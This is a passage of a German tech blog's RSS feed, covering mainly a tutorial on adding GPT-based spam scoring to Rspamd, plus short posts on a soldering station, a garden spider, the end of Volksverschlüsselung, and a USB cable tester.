+<p class="has-small-font-size">Denkt also bitte einmal darüber nach, ob ihr allem, was ihr direkt mit dem Internet verbunden habt, mindestens das gleiche Vertrauen entgegenbringt wie eurer Haustür oder Wohnungstür. Denkt an die <em>security.txt</em> und daran, dass, wenn sich jemand die Mühe macht, euch über ein solches Problem zu informieren, diese Person damit wahrscheinlich den größten Aufwand und auch das größte Risiko für sich selbst aufnimmt – nur, um euch auf ein Problem hinzuweisen.<br>Einen solchen Fund zu ignorieren, zu verkaufen oder sonst wie auszunutzen, ist deutlich einfacher, als den Betreiber zu informieren.</p>
+
+
+
+<p class="has-small-font-size">Natürlich gibt es auch hier schwarze Schafe, aber die Vertrauenswürdigkeit einer solchen Nachricht lässt sich meist schnell per Google oder auch ChatGPT prüfen.<br>Frage? Dann fragen. <img src="https://s.w.org/images/core/emoji/16.0.1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.kernel-error.de/2025/10/30/ip-kameras-risiken-portfreigaben-rtsp-http-checks/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>GPT in Rspamd aktivieren: so nutze ich das LLM-Signal im Score</title>
+		<link>https://www.kernel-error.de/2025/09/30/gpt-in-rspamd-aktivieren/</link>
+					<comments>https://www.kernel-error.de/2025/09/30/gpt-in-rspamd-aktivieren/#comments</comments>
+		
+		<dc:creator><![CDATA[kernel-error]]></dc:creator>
+		<pubDate>Tue, 30 Sep 2025 15:03:44 +0000</pubDate>
+				<category><![CDATA[Kernel-Error-Blog]]></category>
+		<category><![CDATA[AI]]></category>
+		<category><![CDATA[ChatGPT]]></category>
+		<category><![CDATA[E-Mail]]></category>
+		<category><![CDATA[KI]]></category>
+		<category><![CDATA[RSPAMD]]></category>
+		<category><![CDATA[SPAM]]></category>
+		<guid isPermaLink="false">https://www.kernel-error.de/?p=3383</guid>
+
+					<description><![CDATA[Setup: FreeBSD 14.3, Rspamd 3.12.1, Postfix + Dovecot. Ich lasse bei kniffligen Mails zusätzlich ein LLM draufschauen. Wichtig: GPT ist bei mir nur ein weiterer Sensor im ganz normalen Rspamd-Scoring — keine Allzweckwaffe und kein „hartes Urteil“. Voraussetzungen OpenAI API Key erstellen: Melde dich auf der Developer-Plattform an, öffne die Seite API Keys und klicke [&#8230;]]]></description>
+										<content:encoded><![CDATA[<div class="wp-block-image">
+<figure class="alignleft size-large is-resized"><img loading="lazy" decoding="async" width="1024" height="683" src="https://www.kernel-error.de/wp-content/uploads/2025/09/gpt-in-rspamd-1024x683.png" alt="" class="wp-image-3391" style="width:210px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/09/gpt-in-rspamd-1024x683.png 1024w, https://www.kernel-error.de/wp-content/uploads/2025/09/gpt-in-rspamd-300x200.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/09/gpt-in-rspamd-768x512.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/09/gpt-in-rspamd-676x451.png 676w, https://www.kernel-error.de/wp-content/uploads/2025/09/gpt-in-rspamd.png 1536w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /></figure></div>
+
+
+<p class="has-small-font-size">Setup: FreeBSD 14.3, Rspamd 3.12.1, Postfix + Dovecot. Ich lasse bei kniffligen Mails zusätzlich ein LLM draufschauen. Wichtig: GPT ist bei mir nur <strong>ein weiterer Sensor</strong> im ganz normalen Rspamd-Scoring — keine Allzweckwaffe und kein „hartes Urteil“.</p>
+
+
+
+<p><strong>Voraussetzungen</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li class="has-small-font-size">Rspamd inkl. <strong>GPT-Plugin</strong> (ab ~3.12.x im Paket; konfiguriert wird in <code>local.d/gpt.conf</code>).</li>
+
+
+
+<li>API-Zugang (OpenAI-kompatibel oder eigener Endpunkt).</li>
+
+
+
+<li>Grundverständnis zu Rspamd-Metrics/Actions (Reject/Add-Header/Greylist).</li>
+</ul>
+
+
+<div class="wp-block-image">
+<figure class="alignleft size-large is-resized"><a href="https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd.jpg"><img loading="lazy" decoding="async" width="1024" height="670" src="https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd-1024x670.jpg" alt="" class="wp-image-3387" style="width:217px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd-1024x670.jpg 1024w, https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd-300x196.jpg 300w, https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd-768x502.jpg 768w, https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd-676x442.jpg 676w, https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd.jpg 1378w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /></a></figure></div>
+
+
+<p class="has-small-font-size"><a href="https://platform.openai.com/api-keys" target="_blank" rel="noreferrer noopener"><strong>OpenAI API Key erstellen</strong>:</a> Melde dich auf der Developer-Plattform an, öffne die Seite <em>API Keys</em> und klicke auf <em>Create new secret key</em>. Lege bei Bedarf Berechtigungen fest oder arbeite mit projektbasierten Keys. Kopiere den Key einmalig und bewahre ihn sicher (root-only) auf – bitte nicht teilen. Nutzung/Kosten siehst du im Usage-Dashboard.</p>
+
+
+
+<p class="has-small-font-size"><strong>Mein <code>gpt.conf</code></strong></p>
+
+
+
+<p class="has-small-font-size">Ich halte die Konfiguration bewusst nüchtern — genug, um robuste Labels zu bekommen, aber ohne Schnickschnack:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># local.d/gpt.conf (Auszug)
+enabled = true;
+type = "openai";
+model = "gpt-4o-mini";
+api_key = "GEHEIMER-KEY";
+
+model_parameters {
+  gpt-4o-mini {
+    max_tokens = 160;
+    temperature = 0.0;
+  }
+}
+
+timeout = 10s;
+allow_ham = true;
+allow_passthrough = false;
+json = false;
+reason_header = "X-GPT-Reason";
+
+input = "text";
+min_words = 1;
+max_size = 256k;
+
+symbols_to_except {
+  RCVD_IN_DNSWL_MED = -0.1;
+  RCVD_IN_DNSWL_HI  = -0.1;
+  DWL_DNSWL_MED     = -0.1;
+  WHITELIST_RECP_ADDR = -0.1;
+  GREYLIST = 0; GREYLIST_CHECK = 0; GREYLIST_SAVE = 0;
+  RCPT_IN_SPAMTRAP = 0; SPAMTRAP = 0; SPAMTRAP_ADDR = 0;
+  RCVD_VIA_SMTP_AUTH = 0; LOCAL_CLIENT = 0; FROM_LOCAL = 0;
+}</pre>
+
+
+
+<p class="has-small-font-size"><strong>Was</strong> bedeutet das?!</p>
+
+
+
+<ul class="wp-block-list">
+<li class="has-small-font-size"><code>model = gpt-4o-mini</code>: flott &amp; günstig, deterministisch per <code>temperature = 0.0</code>.</li>
+
+
+
+<li class="has-small-font-size"><code>allow_ham = true</code>: GPT darf „HAM“ melden (kleines, positives Signal).</li>
+
+
+
+<li class="has-small-font-size"><code>allow_passthrough = false</code>: Bei Fehlern (Timeout/API down) <strong>keine</strong> stillen Freifahrten.</li>
+
+
+
+<li class="has-small-font-size"><code>reason_header = "X-GPT-Reason"</code>: Kurzbegründung landet im Header (s.u. Datenschutz).</li>
+
+
+
+<li class="has-small-font-size"><code>symbols_to_except</code>: Offensichtliche interne Fälle werden neutralisiert, damit GPT nicht in klaren Situationen wirkt.</li>
+
+
+
+<li class="has-small-font-size">Limits: <code>min_words = 1</code>, <code>max_size = 256k</code>, <code>timeout = 10s</code>.</li>
+</ul>
+
+
+
+<p class="has-small-font-size"><strong>Metric/Scoring: drei GPT-Symbole</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">symbols {
+  GPT_SPAM       { weight = 9.0;  group = "gpt"; description = "GPT: classified as SPAM"; }
+  GPT_SUSPICIOUS { weight = 4.5;  group = "gpt"; description = "GPT: classified as SUSPICIOUS"; }
+  GPT_HAM        { weight = -0.5; group = "gpt"; one_shot = true; description = "GPT: classified as HAM"; }
+}</pre>
+
+
+
+<p class="has-small-font-size">GPT wirkt wie ein starker, aber nicht absoluter Faktor. <br>
+&#8211; <strong>SPAM (9.0)</strong>: kräftiger Zuschlag.<br>
+&#8211; <strong>SUSPICIOUS (4.5)</strong>: sanfter Schubs Richtung Greylist/Review.<br>
+&#8211; <strong>HAM (-0.5)</strong>: kleine Entlastung, einmalig pro Mail.</p>
+
+
+
+<p class="has-small-font-size"><strong>Warum diese Gewichte?</strong><br>Die Zahlen habe ich bewusst so gewählt, dass das GPT-Signal stark, aber nie absolut ist. Rspamd summiert Scores, GPT ist also nur ein Faktor:</p>
+
+
+
+<ul class="wp-block-list has-small-font-size">
+<li><code>GPT_SPAM = 9.0</code>: genug, um bei Kombination mit klassischen Checks (Bayes, RBL, DMARC) die Add-Header-Schwelle sicher zu reißen, aber unterhalb von <em>reject</em> allein.</li>
+
+
+
+<li><code>GPT_SUSPICIOUS = 4.5</code>: halber Wert, schiebt Grauzonen in Richtung Greylist/Review, ohne sofortige Eskalation.</li>
+
+
+
+<li><code>GPT_HAM = -0.5</code>: nur eine kleine Entlastung (one_shot). So verhindert man, dass GPT-HAM mehrere Punkte abzieht und Spams „rettet“.</li>
+</ul>
+
+
+
+<p class="has-small-font-size"><strong>Wie wird die GPT-Gewichtung berechnet?</strong><br>In den Logs/WebUI taucht das oft so auf: <code>GPT_SPAM(2.10)[0.85]</code>. Das bedeutet:</p>
+
+
+
+<ul class="wp-block-list">
+<li class="has-small-font-size"><code>[0.85]</code> = Rohwert von GPT, z. B. 85 % Wahrscheinlichkeit für Spam.</li>
+
+
+
+<li class="has-small-font-size"><code>weight</code> aus der Metric (z. B. 9.0 für <code>GPT_SPAM</code>).</li>
+
+
+
+<li class="has-small-font-size">Grundformel: <code>Rohwert × weight</code> → ergibt den Beitrag zum Gesamtscore.</li>
+
+
+
+<li class="has-small-font-size"><em>Hinweis:</em> Je nach Rspamd-Version kann der im Header gezeigte Wert zusätzlich <strong>skaliert</strong> sein (z. B. falls das Modell nur ein „softes“ Signal liefert). Deshalb sieht man in der Praxis häufig 2–8 Punkte statt des Maximalgewichts.</li>
+</ul>
+
+
+
+<p class="has-small-font-size"><strong>Actions/Schwellen</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">actions {
+  greylist = 4;
+  add_header = 6;
+  reject = 15;
+}</pre>
+
+
+
+<p class="has-small-font-size">SUSPICIOUS (4.5) kippt oft in Greylist. SPAM (9.0) bringt fast immer Add-Header, Reject nur zusammen mit weiteren harten Befunden. Klassische Checks (SPF/DKIM/DMARC, RBL, Bayes) bleiben führend, GPT ergänzt nur.</p>
+
+
+
+<p class="has-small-font-size"><strong>Tuning</strong><br>
+Zu bissig? Gewicht etwas senken.<br>
+Zu lasch? Gewicht erhöhen.<br>
+Zu optimistisch bei HAM? Gewicht kleiner machen oder 0 setzen.<br>
+Header mit <code>X-GPT-Reason</code> liefert Nachvollziehbarkeit, kann bei Bedarf wieder entfernt werden.</p>
+
+
+
+<p class="has-small-font-size"><strong>Praxis</strong><br>
+&#8211; Symbole erscheinen im WebUI und Logfiles.<br>
+&#8211; <code>X-GPT-Reason</code> erklärt im Header die Bewertung.<br>
+&#8211; Latenz/Kosten: <em>gpt-4o-mini</em> mit 160 Tokens und 10 s Timeout ist performant und günstig.</p>
+
+
+
+<p class="has-small-font-size"><strong>Jetzt schauen wir uns mal die Mailheader eines echten Beispiels an und wie GPT dort gegriffen hat:</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">X-Spamd-Result: default: False [8.59 / 15.00];
+        VIOLATED_DIRECT_SPF(3.50)[];
+        GPT_SPAM(2.10)[0.85];
+        MISSING_MIMEOLE(2.00)[];
+        CTYPE_MIXED_BOGUS(1.00)[];
+        MID_RHS_NOT_FQDN(0.50)[];
+        DMARC_POLICY_ALLOW_WITH_FAILURES(-0.50)[];
+        MIME_HTML_ONLY(0.20)[];
+        R_DKIM_ALLOW(-0.20)[thejewelbox.dd:s=1759374209.thejewelbox];
+        ...
+</pre>
+
+
+
+<p><strong>Erklärung:</strong></p>
+
+
+
+<ul class="wp-block-list has-small-font-size">
+<li><code>X-Spamd-Result: [8.59 / 15.00]</code> – Gesamtscore 8.59, Reject-Schwelle bei 15. Hier also <em>kein Reject</em>, sondern nur Add-Header.</li>
+
+
+
+<li><code>GPT_SPAM(2.10)[0.85]</code> – GPT meldet Spam mit 85 % Sicherheit (<code>[0.85]</code>). Daraus errechnet Rspamd den Beitrag (<code>(…)</code>), der in den Gesamtscore einfließt.</li>
+
+
+
+<li>Die klassischen Checks wie <code>VIOLATED_DIRECT_SPF(3.50)</code> oder <code>MISSING_MIMEOLE(2.00)</code> haben ebenfalls beigetragen – GPT ist also nur <strong>ein Faktor</strong> im Gesamtbild.</li>
+</ul>
+
+
+
+<p class="has-small-font-size"><strong>Zusätzlich schreibt das GPT-Modul auf Wunsch auch eine kurze Begründung in den Mailheader:</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">X-GPT-Reason: This email is likely spam due to the urgency created around an unpaid invoice and the mismatch between the sender's domain and the company name.</pre>
+
+
+
+<p><strong>Erklärung:</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li class="has-small-font-size"><code>X-GPT-Reason</code> – eigener Header, den du in <code>gpt.conf</code> mit <code>reason_header = "X-GPT-Reason"</code> aktivierst.</li>
+
+
+
+<li class="has-small-font-size">Der Text stammt direkt aus dem Modell und begründet die Einstufung (hier: Dringlichkeit „unpaid invoice“ + Domain/Company-Mismatch).</li>
+
+
+
+<li class="has-small-font-size">Nützlich für Analyse/Transparenz; kann auf MTA/MDA-Ebene wieder entfernt werden, wenn du ihn nicht bis zum Postfach durchreichen willst.</li>
+</ul>
+
+
+
+<p class="has-small-font-size"><strong>Ein Hinweis zum Datenschutz (gesamt)</strong><br>Mit GPT-Integration gehen Mailinhalte an einen externen Dienst (z. B. OpenAI). Das kann datenschutzrechtlich relevant sein. Wer sensible oder personenbezogene Daten verarbeitet, sollte vorher prüfen, ob die Nutzung zulässig ist – oder alternativ ein selbst gehostetes, OpenAI-kompatibles Modell nutzen (z. B. <a href="https://ollama.com/" target="_blank" rel="noreferrer noopener">Ollama</a>). Den Reason-Header kannst du, falls nötig, serverseitig wieder entfernen.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.kernel-error.de/2025/09/30/gpt-in-rspamd-aktivieren/feed/</wfw:commentRss>
+			<slash:comments>4</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Preciva 992D+ im Test: Löt- und Heißluftstation für Hobby &#038; Repaircafé</title>
+		<link>https://www.kernel-error.de/2025/09/09/preciva-992d-im-test-loet-und-heissluftstation-fuer-hobby-repaircafe/</link>
+					<comments>https://www.kernel-error.de/2025/09/09/preciva-992d-im-test-loet-und-heissluftstation-fuer-hobby-repaircafe/#respond</comments>
+		
+		<dc:creator><![CDATA[kernel-error]]></dc:creator>
+		<pubDate>Tue, 09 Sep 2025 09:30:15 +0000</pubDate>
+				<category><![CDATA[Kernel-Error-Blog]]></category>
+		<category><![CDATA[Elektronik]]></category>
+		<category><![CDATA[Elektrotechnik]]></category>
+		<category><![CDATA[Empfehlung]]></category>
+		<category><![CDATA[löten]]></category>
+		<category><![CDATA[Preciva-992D+]]></category>
+		<category><![CDATA[Tools]]></category>
+		<guid isPermaLink="false">https://www.kernel-error.de/?p=3376</guid>
+
+					<description><![CDATA[Weiter geht es mit einer Lötstation. Wie immer: Das ist ein Werkzeug, das ich selbst einsetze. Es bedeutet nicht, dass es das Beste der Welt ist oder dass man damit sofort eine professionelle SMD-Reparaturwerkstatt eröffnen sollte. Ende des letzten Jahres war ich auf der Suche nach einer kompakten Lötstation, die eine ordentliche Wattleistung hat und [&#8230;]]]></description>
+										<content:encoded><![CDATA[<div class="wp-block-image">
+<figure class="alignleft size-full is-resized"><img loading="lazy" decoding="async" width="600" height="450" src="https://www.kernel-error.de/wp-content/uploads/2025/09/Loetstation-Preciva-992D.jpg" alt="Picture of Soldering Station Preciva 992D+" class="wp-image-3377" style="width:193px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/09/Loetstation-Preciva-992D.jpg 600w, https://www.kernel-error.de/wp-content/uploads/2025/09/Loetstation-Preciva-992D-300x225.jpg 300w" sizes="auto, (max-width: 600px) 100vw, 600px" /></figure></div>
+
+
+<p>Weiter geht es mit einer Lötstation. Wie immer: Das ist ein Werkzeug, das ich selbst einsetze. Es bedeutet nicht, dass es das Beste der Welt ist oder dass man damit sofort eine professionelle SMD-Reparaturwerkstatt eröffnen sollte.</p>
+
+
+
+<p>Ende des letzten Jahres war ich auf der Suche nach einer kompakten Lötstation, die eine ordentliche Wattleistung hat und eine Kombination aus Lötstation und Heißluftstation bietet. Sie sollte aber nicht zu teuer sein. Einzelne Geräte hatte ich zwar schon verschiedene, aber gedacht war es eher für den mobilen Einsatz im Repaircafé. Die dortigen Reparaturen sind meist überschaubar.</p>
+
+
+
+<p>Dennoch muss ich zugeben, dass mich diese Station tatsächlich überrascht hat. Preis/Leistung sind wirklich gut. Fun Fact: Die <a href="https://www.kernel-error.de/2024/10/14/meine-fritzbox-7590-und-die-spannungswandler/" data-type="post" data-id="2649">FritzBox-Reparatur</a> habe ich mit genau dieser Station gemacht – einfach um zu testen, was geht – und ja, es ging, und das sogar wirklich okay.</p>
+
+
+
+<div class="wp-block-envira-envira-gallery"><div class="envira-gallery-feed-output"><img decoding="async" class="envira-gallery-feed-image" src="https://www.kernel-error.de/wp-content/uploads/2025/09/Loetstation-Preciva-992D-7-676x507-640x480.jpg" title="Loetstation-Preciva-992D-7" alt="" /></div></div>
+
+
+
+<p>Natürlich ist sie nicht mit einer großen professionellen Station von beispielsweise Weller zu vergleichen. Aber das ist auch gar nicht der Anspruch. Das Ding kostet aktuell auf Amazon knapp 130 €. Dafür bekommt man 6 verschiedene Lötspitzen, Lötzinn, Heißluft mit verschiedenen Aufsätzen, ein digitales Display und ach … schaut mal selbst: <a href="https://amzn.to/47zAAmr" target="_blank" rel="noreferrer noopener">https://amzn.to/47zAAmr</a></p>
+
+
+
+<p>Ich würde behaupten: Die meisten Hobbyreparaturen – selbst im Bereich SMD – lassen sich damit problemlos durchführen. Aber hey, das ist nur meine Meinung <img src="https://s.w.org/images/core/emoji/16.0.1/72x72/1f600.png" alt="😀" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.kernel-error.de/2025/09/09/preciva-992d-im-test-loet-und-heissluftstation-fuer-hobby-repaircafe/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Unbekannte Spinne im Garten: Wolfsspinne oder doch etwas anderes?</title>
+		<link>https://www.kernel-error.de/2025/09/08/unbekannte-spinne-im-garten-wolfsspinne-oder-doch-etwas-anderes/</link>
+					<comments>https://www.kernel-error.de/2025/09/08/unbekannte-spinne-im-garten-wolfsspinne-oder-doch-etwas-anderes/#comments</comments>
+		
+		<dc:creator><![CDATA[kernel-error]]></dc:creator>
+		<pubDate>Mon, 08 Sep 2025 09:40:27 +0000</pubDate>
+				<category><![CDATA[Kernel-Error-Blog]]></category>
+		<category><![CDATA[Garten]]></category>
+		<category><![CDATA[Insekt]]></category>
+		<category><![CDATA[Insekten]]></category>
+		<category><![CDATA[Spinne]]></category>
+		<guid isPermaLink="false">https://www.kernel-error.de/?p=3364</guid>
+
+					<description><![CDATA[Ich selbst habe kein Problem mit Spinnen – das ist aber beim Rest meiner Familie nicht immer gegeben. Wie auch immer: Ich bilde mir ein, die meisten Spinnenarten, die hier in NRW so im Garten vorkommen, schon mal irgendwann gesehen zu haben. In den letzten Wochen finde ich aber immer mal wieder ein paar – [&#8230;]]]></description>
+										<content:encoded><![CDATA[<div class="wp-block-image">
+<figure class="alignleft size-full is-resized"><img loading="lazy" decoding="async" width="600" height="343" src="https://www.kernel-error.de/wp-content/uploads/2025/09/Spinne-Garten.jpg" alt="Picture of a dead spider." class="wp-image-3366" style="width:193px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/09/Spinne-Garten.jpg 600w, https://www.kernel-error.de/wp-content/uploads/2025/09/Spinne-Garten-300x172.jpg 300w" sizes="auto, (max-width: 600px) 100vw, 600px" /></figure></div>
+
+
+<p>Ich selbst habe kein Problem mit Spinnen – das ist aber beim Rest meiner Familie nicht immer gegeben. Wie auch immer: Ich bilde mir ein, die meisten Spinnenarten, die hier in NRW so im Garten vorkommen, schon mal irgendwann gesehen zu haben. In den letzten Wochen finde ich aber immer mal wieder ein paar – für meinen Eindruck – recht große Exemplare, wenn auch bisher immer nur tot.</p>
+
+
+
+<div class="wp-block-envira-envira-gallery"><div class="envira-gallery-feed-output"><img decoding="async" class="envira-gallery-feed-image" src="https://www.kernel-error.de/wp-content/uploads/2025/09/Spinne-3-676x507-640x480.jpg" title="Spinne-3" alt="" /></div></div>
+
+
+
+<p>Eines habe ich mal fotografiert und zum Größenvergleich neben eine 10-Cent-Münze gelegt. Die AI sagt, dass es eine Wolfsspinne ist. Da würde ich aber spontan eher nach Nordamerika schielen. Kurz: Ich habe keine Ahnung. Fällt jemandem von euch etwas ein? <strong>Was ist das für eine Spinne?!</strong></p>
+
+
+
+<p></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.kernel-error.de/2025/09/08/unbekannte-spinne-im-garten-wolfsspinne-oder-doch-etwas-anderes/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Volksverschlüsselung wird eingestellt</title>
+		<link>https://www.kernel-error.de/2025/09/07/volksverschluesselung-wird-eingestellt/</link>
+					<comments>https://www.kernel-error.de/2025/09/07/volksverschluesselung-wird-eingestellt/#comments</comments>
+		
+		<dc:creator><![CDATA[kernel-error]]></dc:creator>
+		<pubDate>Sun, 07 Sep 2025 12:13:02 +0000</pubDate>
+				<category><![CDATA[Kernel-Error-Blog]]></category>
+		<category><![CDATA[cacert.org]]></category>
+		<category><![CDATA[IT-Security]]></category>
+		<category><![CDATA[S/MIME-Zertifikat]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Volksverschlüsselung]]></category>
+		<guid isPermaLink="false">https://www.kernel-error.de/?p=3353</guid>
+
+					<description><![CDATA[An mir flog gerade die Information vorbei, dass die Volksverschlüsselung zum 31.01.2026 eingestellt wird. Ich habe mir dort vor ein paar Jahren mal ein S/MIME-Zertifikat für meine E-Mails geholt. Mir hat der Ansatz gefallen, dass man sich mit seinem neuen Personalausweis und dessen Online-Funktion dort legitimieren kann und im Anschluss sein Zertifikat bekommt. Für mich [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>An mir flog gerade die Information vorbei, dass die <a href="https://volksverschluesselung.de/" data-type="link" data-id="https://volksverschluesselung.de/" target="_blank" rel="noreferrer noopener">Volksverschlüsselung</a> zum <strong>31.01.2026</strong> eingestellt wird. Ich habe mir dort vor ein paar Jahren mal ein S/MIME-Zertifikat für meine E-Mails geholt. Mir hat der Ansatz gefallen, dass man sich mit seinem neuen Personalausweis und dessen Online-Funktion dort legitimieren kann und im Anschluss sein Zertifikat bekommt. Für mich hat diese Abhängigkeit absolut Sinn ergeben. Wir haben ja schon alle einen Perso mit Online-Funktion und PIN und was weiß ich alles. Also warum nicht auch einfach und schnell Zertifikate darüber erstellen?</p>
+
+
+<div class="wp-block-image">
+<figure class="alignleft size-full is-resized"><a href="https://www.kernel-error.de/wp-content/uploads/2025/09/volksverschluesselung.png"><img loading="lazy" decoding="async" width="809" height="588" src="https://www.kernel-error.de/wp-content/uploads/2025/09/volksverschluesselung.png" alt="Screenshot der Meldung zur Einstellung des Dienstes Volksverschlüsselung." class="wp-image-3354" style="width:234px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/09/volksverschluesselung.png 809w, https://www.kernel-error.de/wp-content/uploads/2025/09/volksverschluesselung-300x218.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/09/volksverschluesselung-768x558.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/09/volksverschluesselung-676x491.png 676w" sizes="auto, (max-width: 809px) 100vw, 809px" /></a></figure></div>
+
+
+<p>Funktioniert hat das alles wirklich gut – leider mit dem gleichen Problemchen wie auch bei <a href="http://www.cacert.org/" data-type="link" data-id="http://www.cacert.org/" target="_blank" rel="noreferrer noopener">cacert.org</a>: Die Root-Zertifikate sind nicht in den Trust Stores der Betriebssysteme, Browser, Mailclients usw. Signiert man also etwas damit, wird es beim Empfänger als ungültig und unsicher angezeigt, es sei denn, dieser installiert manuell die Root-Zertifikate. Das macht natürlich niemand. Damit war die Volksverschlüsselung für mich genauso raus wie leider auch cacert.org.</p>
+
+
+
+<p>Nun hing hinter der Volksverschlüsselung ebenfalls das Fraunhofer-Institut. Meine Hoffnung war, dass über diesen Weg am Ende doch mal die Root-Zertifikate in die Trust Stores kommen. Aber leider nicht.</p>
+
+
+
+<p>Die Diskussion, ob man Trust Stores wirklich braucht, ob man sie vor allem vorgefüllt braucht, mache ich genauso wenig auf wie DNSSEC und TLSA, ok? Denn uns allen ist ja inzwischen klar, dass wir es „sicher“ haben könnten – wenn man nur nicht so scheiß viel Geld mit den CAs verdienen könnte. Denn die ganzen CAs zahlen ja schon ein paar Euro, um in die Trust Stores zu kommen <img src="https://s.w.org/images/core/emoji/16.0.1/72x72/1f609.png" alt="😉" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+
+
+
+<p>Soviel dann also zur Volksverschlüsselung.</p>
+
+
+
+<p></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.kernel-error.de/2025/09/07/volksverschluesselung-wird-eingestellt/feed/</wfw:commentRss>
+			<slash:comments>2</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>USB-Kabeltester: Kabelbrüche &#038; Datenfähigkeiten schnell prüfen</title>
+		<link>https://www.kernel-error.de/2025/09/01/kabelfaehigkeiten-kabelbrueche-finden-der-usb-kabeltester/</link>
+					<comments>https://www.kernel-error.de/2025/09/01/kabelfaehigkeiten-kabelbrueche-finden-der-usb-kabeltester/#respond</comments>
+		
+		<dc:creator><![CDATA[kernel-error]]></dc:creator>
+		<pubDate>Mon, 01 Sep 2025 13:05:07 +0000</pubDate>
+				<category><![CDATA[Kernel-Error-Blog]]></category>
+		<category><![CDATA[Elektronik]]></category>
+		<category><![CDATA[Elektrotechnik]]></category>
+		<category><![CDATA[Empfehlung]]></category>
+		<category><![CDATA[Tools]]></category>
+		<guid isPermaLink="false">https://www.kernel-error.de/?p=3344</guid>
+
+					<description><![CDATA[Das hier ist zugleich der Auftakt einer kleinen Beitragsserie unter dem Titel „Was hast du in deiner Elektronikwerkstatt?“. Vor allem nach dem Beitrag zur FritzBox wurde diese Frage mehrfach an mich herangetragen. Um gleich Klarheit zu schaffen: Von einer „Elektronikwerkstatt“ kann bei mir keine Rede sein. Was du hier siehst, ist meine kleine „Healing-Bench“ – [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>Das hier ist zugleich der Auftakt einer kleinen Beitragsserie unter dem Titel <em>„Was hast du in deiner Elektronikwerkstatt?“</em>. Vor allem nach dem Beitrag zur <a href="https://www.kernel-error.de/2024/10/14/meine-fritzbox-7590-und-die-spannungswandler/" data-type="post" data-id="2649">FritzBox</a> wurde diese Frage mehrfach an mich herangetragen.</p>
+
+
+<div class="wp-block-image">
+<figure class="alignleft size-full is-resized"><img loading="lazy" decoding="async" width="900" height="675" src="https://www.kernel-error.de/wp-content/uploads/2025/09/USB-Kabeltester-Titel.jpg" alt="USB Kabeltester mit leuchtenden LEDs und eingestecktem USB-C Kabel." class="wp-image-3345" style="width:181px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/09/USB-Kabeltester-Titel.jpg 900w, https://www.kernel-error.de/wp-content/uploads/2025/09/USB-Kabeltester-Titel-300x225.jpg 300w, https://www.kernel-error.de/wp-content/uploads/2025/09/USB-Kabeltester-Titel-768x576.jpg 768w, https://www.kernel-error.de/wp-content/uploads/2025/09/USB-Kabeltester-Titel-676x507.jpg 676w" sizes="auto, (max-width: 900px) 100vw, 900px" /></figure></div>
+
+
+<p>Um gleich Klarheit zu schaffen: Von einer „Elektronikwerkstatt“ kann bei mir keine Rede sein. Was du hier siehst, ist meine kleine <em>„Healing-Bench“</em> – ganz sicher keine vollwertige Werkstatt und ohne entsprechenden Anspruch. Ich repariere und bastle Elektronik aus reinem Hobby, und man kann sich daran also vermutlich nicht unbedingt ein Beispiel nehmen. Aber hey, ihr habt gefragt – und ich hab was zu erzählen.</p>
+
+
+
